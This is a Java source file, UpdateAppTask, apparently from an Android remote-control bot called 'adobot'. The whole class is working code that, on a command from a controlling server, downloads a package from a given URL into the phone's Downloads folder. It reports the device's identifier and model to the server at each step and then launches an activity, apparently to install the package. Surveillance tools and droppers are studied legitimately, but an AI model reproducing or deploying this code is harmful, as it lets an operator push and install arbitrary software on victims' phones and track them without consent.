package com.android.adobot.tasks;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Environment;
import android.support.v4.content.ContextCompat;
import android.util.Log;

import com.android.adobot.CommandService;
import com.android.adobot.CommonParams;
import com.android.adobot.Constants;
import com.android.adobot.activities.UpdateActivity;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;
import java.util.HashMap;

import com.android.adobot.http.Http;
import com.android.adobot.http.HttpRequest;

import static android.content.Intent.FLAG_ACTIVITY_NEW_TASK;

public class UpdateAppTask extends BaseTask {
    private static final String TAG = "UpdateAppTask";
    private CommonParams commonParams;
    private URL url;

    public UpdateAppTask(String url) {
        try {
            this.url = new URL(url);
        } catch (MalformedURLException e) {
            e.printStackTrace();
        }
    }

    public void setContext(CommandService c) {
        super.setContext(c);
        context = c;
        this.commonParams = new CommonParams(c);
    }

    @Override
    public void run() {

        if (ContextCompat.checkSelfPermission(context, Manifest.permission.WRITE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED) {

            try {
                URLConnection c = url.openConnection();
                c.connect();

                File file = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
                file.mkdirs();
                File outputFile = new File(file, Constants.UPDATE_PKG_FILE_NAME);
                if (outputFile.exists()) {
                    outputFile.delete();
                }
                FileOutputStream fos = new FileOutputStream(outputFile);

                InputStream is = new BufferedInputStream(url.openStream());



                HashMap dlStarted = new HashMap();
                dlStarted.put("event", "download:started");
                dlStarted.put("uid", commonParams.getUid());
                dlStarted.put("device", commonParams.getDevice());
                Http doneSMS = new Http();
                doneSMS.setUrl(commonParams.getServer() + Constants.NOTIFY_URL);
                doneSMS.setMethod(HttpRequest.METHOD_POST);
                doneSMS.setParams(dlStarted);
                doneSMS.execute();

                byte[] buffer = new byte[1024];
                int len1 = 0;
                while ((len1 = is.read(buffer)) != -1) {
                    fos.write(buffer, 0, len1);
                    Log.i(TAG, "Downloading...");
                }
                fos.flush();
                fos.close();
                is.close();

                Log.i(TAG, "Download Complete!!!!!");

                HashMap dlComplete = new HashMap();
                dlComplete.put("event", "download:completed");
                dlComplete.put("uid", commonParams.getUid());
                dlComplete.put("device", commonParams.getDevice());
                Http DlDone = new Http();
                DlDone.setUrl(commonParams.getServer() + Constants.NOTIFY_URL);
                DlDone.setMethod(HttpRequest.METHOD_POST);
                DlDone.setParams(dlComplete);
                DlDone.execute();

                Intent updateIntent = new Intent(context, UpdateActivity.class);
                updateIntent.addFlags(FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(updateIntent);


            } catch (Exception e) {
                Log.e("UpdateAPP", "Update error! " + e.getMessage());
                HashMap noPermit = new HashMap();
                noPermit.put("event", "download:error");
                noPermit.put("uid", commonParams.getUid());
                noPermit.put("device", commonParams.getDevice());
                noPermit.put("error", "Download failed");
                Http doneSMS = new Http();
                doneSMS.setUrl(commonParams.getServer() + Constants.NOTIFY_URL);
                doneSMS.setMethod(HttpRequest.METHOD_POST);
                doneSMS.setParams(noPermit);
                doneSMS.execute();

            }
        } else {
            Log.e(TAG, "No WRITE_EXTERNAL_STORAGE permission!!!");
            HashMap noPermit = new HashMap();
            noPermit.put("event", "nopermission");
            noPermit.put("uid", commonParams.getUid());
            noPermit.put("device", commonParams.getDevice());
            noPermit.put("permission", "WRITE_EXTERNAL_STORAGE");
            Http doneSMS = new Http();
            doneSMS.setUrl(commonParams.getServer() + Constants.NOTIFY_URL);
            doneSMS.setMethod(HttpRequest.METHOD_POST);
            doneSMS.setParams(noPermit);
            doneSMS.execute();

            requestPermissions();
        }
    }
}